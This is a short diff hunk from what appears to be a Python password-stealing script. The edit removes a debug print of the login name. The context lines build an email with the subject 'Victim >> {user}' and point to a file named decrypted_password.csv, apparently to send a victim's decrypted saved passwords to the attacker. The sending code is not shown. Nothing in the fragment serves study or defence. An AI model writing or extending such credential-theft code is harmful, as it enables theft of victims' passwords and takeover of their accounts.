@@ -136,7 +136,6 @@ if __name__ == '__main__':
     finally:
         a = os.getcwd()
         user = os.getlogin()
-        print(user)
         subject = f"Victim >> {user}"
         body = ""
         path = a + "\\decrypted_password.csv"
